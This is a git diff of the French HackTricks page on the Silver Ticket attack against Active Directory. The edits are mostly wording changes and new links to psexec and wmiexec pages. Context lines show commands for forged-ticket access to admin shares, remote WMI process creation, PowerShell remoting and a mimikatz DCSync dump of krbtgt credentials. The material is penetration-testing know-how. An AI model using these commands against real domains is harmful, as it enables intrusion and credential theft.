@@ -1,4 +1,4 @@
-# Billet Silver
+# Ticket Silver
 
 <details>
 
@@ -16,13 +16,13 @@ Autres façons de soutenir HackTricks :
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Astuce de prime de bug** : **inscrivez-vous** à **Intigriti**, une plateforme de **prime de bug premium créée par des pirates informatiques, pour des pirates informatiques** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui et commencez à gagner des primes allant jusqu'à **100 000 $** !
+**Conseil de prime de bug** : **inscrivez-vous** à **Intigriti**, une plateforme de **prime de bug premium créée par des pirates informatiques, pour des pirates informatiques** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez à gagner des primes allant jusqu'à **100 000 $** !
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
-## Billet Silver
+## Ticket Silver
 
-L'attaque du **Billet Silver** implique l'exploitation des tickets de service dans les environnements Active Directory (AD). Cette méthode repose sur **l'acquisition du hachage NTLM d'un compte de service**, tel qu'un compte d'ordinateur, pour falsifier un ticket de Service de Billetterie (TGS). Avec ce ticket falsifié, un attaquant peut accéder à des services spécifiques sur le réseau, **en se faisant passer pour n'importe quel utilisateur**, visant généralement les privilèges administratifs. Il est souligné que l'utilisation de clés AES pour falsifier des tickets est plus sécurisée et moins détectable.
+L'attaque du **Ticket Silver** implique l'exploitation des tickets de service dans les environnements Active Directory (AD). Cette méthode repose sur **l'acquisition du hachage NTLM d'un compte de service**, tel qu'un compte d'ordinateur, pour falsifier un ticket de Service de Billetterie (TGS). Avec ce ticket falsifié, un attaquant peut accéder à des services spécifiques sur le réseau, **en se faisant passer pour n'importe quel utilisateur**, visant généralement les privilèges administratifs. Il est souligné que l'utilisation de clés AES pour falsifier des tickets est plus sécurisée et moins détectable.
 
 Pour la création de tickets, différents outils sont utilisés en fonction du système d'exploitation :
 
@@ -48,13 +48,13 @@ Le service CIFS est mis en avant comme une cible courante pour accéder au syst�
 
 ## Services Disponibles
 
-| Type de Service                           | Tickets Silver pour le Service                                             |
+| Type de Service                            | Tickets Silver pour le Service                                             |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>En fonction du système d'exploitation également :</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Dans certains cas, vous pouvez simplement demander : WINRM</p> |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>En fonction du système d'exploitation également:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Dans certains cas, vous pouvez simplement demander: WINRM</p> |
 | Tâches Planifiées                         | HOST                                                                       |
-| Partage de Fichiers Windows, également psexec | CIFS                                                                       |
+| Partage de fichiers Windows, également psexec | CIFS                                                                       |
 | Opérations LDAP, incluant DCSync           | LDAP                                                                       |
 | Outils d'Administration de Serveur à Distance Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
 | Tickets d'Or                               | krbtgt                                                                     |
@@ -81,6 +81,12 @@ dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+Vous pourrez également obtenir un shell à l'intérieur de l'hôte ou exécuter des commandes arbitraires en utilisant **psexec**:
+
+{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
+[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
+{% endcontent-ref %}
+
 ### HÔTE
 
 Avec cette autorisation, vous pouvez générer des tâches planifiées sur des ordinateurs distants et exécuter des commandes arbitraires:
@@ -107,6 +113,12 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+Trouvez **plus d'informations sur wmiexec** sur la page suivante:
+
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
+{% endcontent-ref %}
+
 ### HÔTE + WSMAN (WINRM)
 
 Avec l'accès winrm sur un ordinateur, vous pouvez **y accéder** et même obtenir un PowerShell:
@@ -115,8 +127,8 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
 Consultez la page suivante pour en savoir plus sur les **autres façons de se connecter à un hôte distant en utilisant winrm**:
 
-{% content-ref url="../ntlm/winrm.md" %}
-[winrm.md](../ntlm/winrm.md)
+{% content-ref url="../lateral-movement/winrm.md" %}
+[winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
@@ -125,7 +137,7 @@ Notez que **winrm doit être actif et en écoute** sur l'ordinateur distant pour
 
 ### LDAP
 
-Avec ce privilège, vous pouvez vider la base de données du DC en utilisant **DCSync**:
+Avec ce privilège, vous pouvez extraire la base de données du contrôleur de domaine en utilisant **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
@@ -152,10 +164,10 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 Autres façons de soutenir HackTricks :
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
